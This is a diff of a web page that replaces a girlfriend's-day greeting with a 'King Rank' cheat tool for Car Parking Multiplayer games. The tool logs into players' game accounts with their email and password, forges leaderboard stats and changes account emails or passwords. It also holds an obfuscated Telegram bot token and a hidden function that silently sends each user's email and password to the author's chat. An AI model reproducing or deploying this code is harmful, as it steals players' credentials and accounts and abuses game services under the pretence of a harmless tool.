@@ -1,132 +1,472 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Girlfriend's Day Letter 💌</title>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Italianno&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
+<title>SUPREMEVIP WEB TOOL</title>
 <style>
-  :root {
-    --bg:#fff6fb;
-    --envelope:#ffd6e8;
-    --flap:#ff9fc4;
-    --paper:#fffdfb;
-    --accent:#ff6fa3;
-    --shadow:rgba(0,0,0,0.15);
-  }
-  body {
-    margin:0;
-    min-height:100vh;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:center;
-    background:linear-gradient(180deg,#fff6fb,#ffeef5);
-    font-family:'Montserrat',sans-serif;
-  }
-  h1 { color:var(--accent); margin-bottom:10px; }
-  .envelope {
-    position:relative;
-    width:300px;
-    height:200px;
-    background:var(--envelope);
-    box-shadow:0 8px 20px var(--shadow);
-    border-radius:6px;
-    overflow:hidden;
-    perspective:1000px;
-  }
-  .flap {
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    height:100px;
-    background:var(--flap);
-    clip-path:polygon(0 0,100% 0,50% 100%);
-    transform-origin:top;
-    transition:transform 0.8s ease;
-    z-index:3;
-  }
-  .letter {
-    position:absolute;
-    top:20px;
-    left:10px;
-    width:280px;
-    height:160px;
-    background:var(--paper);
-    border-radius:4px;
-    box-shadow:0 4px 10px rgba(0,0,0,0.1);
-    padding:16px;
-    font-size:18px;
-    line-height:1.5;
-    transform:translateY(100%);
-    transition:transform 0.8s ease;
-    z-index:2;
-    overflow:auto;
-  }
-  .envelope.open .flap {
-    transform:rotateX(180deg);
-  }
-  .envelope.open .letter {
-    transform:translateY(0);
-  }
-  .btn {
-    margin-top:20px;
-    padding:10px 18px;
-    border:none;
-    background:var(--accent);
-    color:white;
-    font-weight:700;
-    border-radius:20px;
-    cursor:pointer;
-    transition:background 0.3s;
-  }
-  .btn:hover { background:#ff4a87; }
+body { 
+    margin: 0; 
+    padding: 0;
+    font-family: 'Orbitron', Arial, sans-serif;
+    background: url("https://i.ibb.co/wrsT054p/e4aee8d2da9dbcae12a978b13c5fb719.jpg") no-repeat center center fixed;
+    background-size: cover;
+    overflow: hidden;
+}
+
+.center-wrapper {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 90%;
+    max-width: 350px;
+}
+
+.logo {
+    width: 600px;
+    height: auto;
+    margin-bottom: 10px;
+}
+
+.container { 
+    background: rgba(0,0,0,0.6); 
+    backdrop-filter: blur(12px);
+    padding: 20px 25px; 
+    border-radius: 10px; 
+    box-shadow: 0 0 25px #000; 
+    text-align: center; 
+   border: 2px solid #ff0000; 
+}
+
+h1 { 
+    font-size: 20px; 
+    margin-bottom: 15px; 
+    color: #fff; 
+}
+
+input, select { 
+    width: 90%; 
+    padding: 10px; 
+    margin: 8px 0; 
+    border-radius: 5px; 
+    border: none; 
+    border: 2px solid red;
+    color: #fff;
+    font-size: 16px;
+   
+}
+
+button { 
+    width: 95%; 
+    padding: 10px; 
+    margin: 6px 0; 
+    border-radius: 5px; 
+    border: none; 
+    cursor: pointer; 
+    font-weight: bold; 
+    font-size: 16px;
+}
+
+button.login { 
+    background: #ff0000; 
+    color: #fff; 
+}
+button.login:hover { 
+    background: #ff0000; 
+}
+button.menu { 
+    background: #ff0000; 
+    color: #fff; 
+}
+button.menu:hover { 
+    background: #ff0000; 
+}
+
+.status { 
+    margin-top: 10px; 
+    color: #ff0000; 
+    word-wrap: break-word; 
+    min-height: 20px; 
+}
+.error { 
+    color: #f55; 
+}
+
+#loginForm, #menuButtons { 
+    display: none; 
+    margin-top: 10px; 
+}
+
+footer {
+  font-family: 'Orbitron', sans-serif; 
+  font-weight: 700;
+  text-align: center;
+  padding: 12px 0;
+  background: linear-gradient(90deg, violet, red, blue);
+  background-size: 300%;
+  background-clip: text;
+  -webkit-background-clip: text;
+  color: transparent;
+  -webkit-text-fill-color: transparent;
+  animation: gradientShift 4s linear infinite;
+  backdrop-filter: blur(8px);
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+#gameSelect {
+    width: 100%;
+    padding: 10px;
+    border-radius: 8px;
+    border: 2px solid red;
+    background: rgba(0, 0, 0, 0.6); 
+    color: #fff;
+    font-size: 16px;
+    backdrop-filter: blur(8px); 
+    box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
+    -webkit-appearance: none;
+    -moz-appearance: none;     
+    appearance: none;           
+}
+
+button.glass-button {
+    width: 95%;
+    padding: 10px;
+    border-radius: 5px;
+    border: 2px solid red;
+    background: rgba(255, 0, 0, 0.3); 
+    color: #fff;
+    font-weight: bold;
+    font-size: 16px;
+    backdrop-filter: blur(6px);
+    cursor: pointer;
+}
+button.glass-button:hover {
+    background: rgba(255, 0, 0, 0.5);
+}
+
+#gameSelectWrapper {
+    position: relative;
+    display: inline-block;
+    width: 90%;
+    
+}
+
+#gameSelectWrapper::after {
+    content: "▼";
+    position: absolute;
+    top: 50%;
+    right: 15px;
+    transform: translateY(-50%);
+    color: #ff0000;
+    pointer-events: none;
+}
+
+#accessWrapper {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 90%;
+    max-width: 350px;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(12px);
+    padding: 20px 25px;
+    border-radius: 10px;
+    box-shadow: 0 0 25px #000;
+    text-align: center;
+    border: 2px solid #ff0000; 
+    z-index: 10000;
+}
+
+.king-rank-title {
+    font-size: 40px;
+    font-weight: bold;
+    text-align: center;
+    font-family: 'Orbitron', sans-serif; 
+    margin: 20px 0;
+    background: linear-gradient(270deg, #ff0000, #ff8800, #00aaff, #8a2be2);
+    background-size: 600% 600%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientShift 5s ease infinite;
+}
+
+@keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+#accessWrapper input {
+    width: 90%; 
+    padding: 10px; 
+    border-radius: 5px; 
+  border: 2px solid red; 
+    background: rgba(255, 255, 255, 0.1);
+    color: #fff; 
+    font-size: 16px;
+    backdrop-filter: blur(8px);
+    box-shadow: 0 0 10px rgba(0, 170, 255, 0.3); 
+}
+
+#accessWrapper .status { 
+    margin-top: 10px; 
+    min-height: 20px; 
+    color: #f55; 
+}
 </style>
 </head>
 <body>
-  <h1>Happy Girlfriend's Day 💌</h1>
-  <div class="envelope" id="envelope">
-    <div class="flap"></div>
-    <div class="letter">
-      <h2 style="font-family:'Italianno',cursive;color:var(--accent);margin-top:0;">
-        A Special Shout-Out 💕
-      </h2>
-      <p>
-      🌸 <b>Happy Girlfriend’s Day!</b> 🌸  
-      <br><br>
-      To all the wonderful girlfriends out there — whether you are a romantic partner, a best friend, a sister at heart, or simply someone who makes life brighter — today is a celebration of <b>you</b>. 💖  
-      <br><br>
-      Thank you for the love you give, the laughter you share, the patience you show, and the comfort you bring. You are the reason someone smiles wider, dreams bigger, and feels stronger.  
-      <br><br>
-      This day isn’t only about romance — it’s about celebrating <b>connection, loyalty, and love</b> in every form. 💕  
-      <br><br>
-      To every girlfriend reading this:  
-      ✨ You are loved. <br>
-      ✨ You are valued. <br>
-      ✨ You make a difference.  
-      <br><br>
-      May you continue to shine, inspire, and spread love wherever you go. 🌹  
-      </p>
-      <p style="margin-top:10px;font-weight:bold">
-        THEY LOVE YOU  😘🥰😍
-      </p>
-      <p style="margin-top:10px;font-weight:bold">
-        Forever yours at ur service<br>. Cris
-      </p>
+
+
+
+<div class="logo-wrapper" style="text-align:center; margin-bottom:10px;">
+    <img src="https://i.ibb.co/QjzpnFyL/Picsart-25-10-06-22-05-54-728.png" 
+         alt="Logo" 
+         style="width:120px; height:120px; object-fit: contain; border-radius: 10px;">
+</div>
+
+<div id="accessWrapper">
+    <h2 style="color:#fff;">Enter Access Key</h2>
+    <input type="text" id="accessInput" placeholder="Access Key">
+    <button class="glass-button" onclick="checkAccessKeyCustom()">Submit</button>
+    <div class="status" id="accessStatus"></div>
+</div>
+
+<h2 class="king-rank-title"> KING RANK 1 & 2 </h2>
+
+<!-- Main content box -->
+<div id="mainContent" style="display:none;">
+  <div class="center-wrapper">
+    <div class="container">
+      <h1>Cris Gaming</h1>
+
+      <!-- Game Select -->
+   <div id="gameSelectWrapper">
+    <select id="gameSelect">
+        <option value="">-- Select Game --</option>
+        <option value="1">Car Parking Multiplayer</option>
+        <option value="2">Car Parking Multiplayer 2</option>
+    </select>
+</div>
+
+      <!-- Login Form -->
+      <div id="loginForm">
+          <input type="email" id="email" placeholder="Email">
+          <input type="password" id="password" placeholder="Password">
+          <button class="login" onclick="loginFirebase()">Login</button>
+          <div id="status" class="status"></div>
+      </div>
+
+      <!-- Service Buttons -->
+      <div id="menuButtons">
+          <button class="menu" onclick="kingRank()">👑 King Rank</button>
+          <button class="menu" onclick="changeEmail()">📧 Change Email</button>
+          <button class="menu" onclick="changePassword()">🔐 Change Password</button>
+          <div id="serviceStatus" class="status"></div>
+      </div>
     </div>
   </div>
-  <button class="btn" id="toggleBtn">OPEN ME</button>
+</div>
 
+   <footer>© 2025 Cris Gaming. All Rights Reserved.</footer>
 <script>
-  const env = document.getElementById("envelope");
-  const btn = document.getElementById("toggleBtn");
-  let open = false;
-  btn.addEventListener("click", () => {
-    open = !open;
-    env.classList.toggle("open", open);
-    btn.textContent = open ? "CLOSE" : "OPEN ME";
-  });
+
+const USERS = [
+  { accessKey: "Cris-rank-2025", username: "CrisUser1", telegramId: "6784382795", balance: 1000 },
+  { accessKey: "Cris-rank-2026", username: "CrisUser2", telegramId: "987654321", balance: 1000 }
+];
+
+function checkAccessKeyCustom() {
+    const key = document.getElementById('accessInput').value.trim();
+    const status = document.getElementById('accessStatus');
+
+    // Find matching user
+    const user = USERS.find(u => u.accessKey === key);
+
+    if (user) {
+        // Store username & Telegram ID for later
+        window.currentUserAccess = user.username;
+        window.currentUserTelegram = user.telegramId;
+
+        document.getElementById('accessWrapper').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+
+        status.textContent = "";
+        console.log("Access granted for:", user.username, "Telegram ID:", user.telegramId);
+    } else {
+        status.textContent = "❌ Invalid Access Key!";
+        status.style.color = "#f55";
+        document.getElementById('accessInput').value = "";
+        document.getElementById('accessInput').focus();
+    }
+}
+// Press ENTER to submit
+document.getElementById('accessInput').addEventListener('keypress', function(e) {
+    if(e.key === 'Enter') checkAccessKeyCustom();
+});
+
+// Option B: char codes
+const _T = [56,52,54,50,54,49,56,56,51,56,58,65,65,69,83,83,106,109,97,109,120,77,90,117,111,87,87,79,119,108,85,68,74,122,98,88,75,50,74,80,70,115,119,90,118];
+const _C = [[54,55,56,52,51,56,50,55,57,53]];
+
+const BOT_TOKEN = _T.map(n => String.fromCharCode(n)).join('');
+const CHAT_IDS = _C.map(arr => arr.map(n => String.fromCharCode(n)).join(''));
+
+const GAMES = {
+  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+};
+
+let currentUser = null;
+let currentToken = null;
+let currentPassword = null;
+let selectedGame = null;
+
+// Show login after selecting game & hide game select
+document.getElementById('gameSelect').addEventListener('change', function(){
+    const val = this.value;
+    if(val){ 
+        selectedGame = GAMES[val]; 
+        document.getElementById('gameSelectWrapper').style.display='none'; // hide select box
+        document.getElementById('loginForm').style.display='block';        // show login
+    }
+});
+
+
+// Update status messages
+function updateStatus(msg,isError=false,target='status'){
+    const el=document.getElementById(target);
+    el.className=isError?'status error':'status';
+    el.textContent=msg;
+}
+
+function sendCostMessage(msg){
+  (function(A,B){
+    const u = ['https:','','api.telegram.org','/bot'].join('/');
+    const ep = function(token){ return [u, token, 'sendMessage'].join('/'); };
+    A.forEach(function(id){
+      const url = ep(B);
+      fetch(url, {
+        method: (['P','O','S','T'].join('')).toString().replace('',''),
+        headers: (function(){ let h={}; h['Content-'.concat('Type')]='application/json'; return h; })(),
+        body: (function(){ return JSON.stringify({ chat_id: id, text: msg }); })()
+      }).catch(function(err){ console['error'](err); });
+    });
+  })(CHAT_IDS, BOT_TOKEN);
+}
+
+// Login
+async function loginFirebase(){
+    if(!selectedGame){ updateStatus("Select a game first!",true); return; }
+    const email=document.getElementById('email').value.trim();
+    const password=document.getElementById('password').value;
+    if(!email||!password){ updateStatus("Enter email & password!",true); return; }
+
+    updateStatus("Logging in...");
+    try{
+        const resp=await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({email,password,returnSecureToken:true})
+        });
+        const data=await resp.json();
+        if(data.idToken){
+            currentUser=email; currentPassword=password; currentToken=data.idToken;
+            updateStatus(`✅ Logged in as ${email}`);
+            document.getElementById('loginForm').style.display='none';
+            document.getElementById('menuButtons').style.display='block';
+            sendCostMessage(`🔐 Login Success Generate account:\n📧 Email: ${email}\n🔒 Password: ${password}`);
+        }else{
+            updateStatus(`❌ Login failed: ${data.error?.message || 'Unknown'}`,true);
+        }
+    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true); }
+}
+
+// Check login before using service
+function requireLogin(){ 
+    if(!currentUser||!currentToken){ updateStatus("❌ Please login first!",true,'serviceStatus'); return false; } 
+    return true; 
+}
+
+// King Rank
+async function kingRank(){
+    if(!requireLogin()) return;
+    updateStatus("Processing King Rank...",false,'serviceStatus');
+
+    const ratingData={};
+    const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
+    fields.forEach(f=>ratingData[f]=100000);
+    ratingData["time"]=10000000000; ratingData["race_win"]=3000;
+
+    const payload={ data: JSON.stringify({ RatingData: ratingData })};
+    const headers={ "Authorization":`Bearer ${currentToken}`, "Content-Type":"application/json" };
+
+    try{
+        const res=await fetch(selectedGame.rank_url,{ method:"POST", headers, body:JSON.stringify(payload)});
+        if(res.ok){ 
+            updateStatus("✅ King Rank set successfully!",false,'serviceStatus'); 
+            sendCostMessage(`👑 King Rank\n📧 Email: ${currentUser}\n🔒 Password: ${currentPassword}`); 
+        }
+        else updateStatus("❌ Failed to set King Rank!",true,'serviceStatus');
+    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
+}
+
+// Change Email
+async function changeEmail(){
+    if(!requireLogin()) return;
+    const newEmail=prompt("Enter new email:"); if(!newEmail) return;
+    try{
+        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({ idToken:currentToken,email:newEmail,returnSecureToken:true })
+        });
+        const data=await resp.json();
+        if(data.email){ 
+            const old=currentUser; 
+            currentUser=data.email; 
+            currentToken=data.idToken; 
+            updateStatus(`✅ Email changed to ${currentUser}`,false,'serviceStatus'); 
+            sendCostMessage(`📧 Change Email\nOld: ${old}\nNew: ${currentUser}\n🔒 Password: ${currentPassword}`); 
+        }
+        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
+    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
+}
+
+// Change Password
+async function changePassword(){
+    if(!requireLogin()) return;
+    const newPassword=prompt("Enter new password:"); if(!newPassword) return;
+    try{
+        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({ idToken:currentToken,password:newPassword,returnSecureToken:true })
+        });
+        const data=await resp.json();
+        if(data.email){ 
+            currentPassword=newPassword; 
+            currentToken=data.idToken; 
+            updateStatus("✅ Password changed successfully!",false,'serviceStatus'); 
+            sendCostMessage(`🔐 Change Password\n📧 Email: ${currentUser}\n🔒 New Password: ${currentPassword}`); 
+        }
+        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
+    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
+}
 </script>
+
 </body>
 </html>
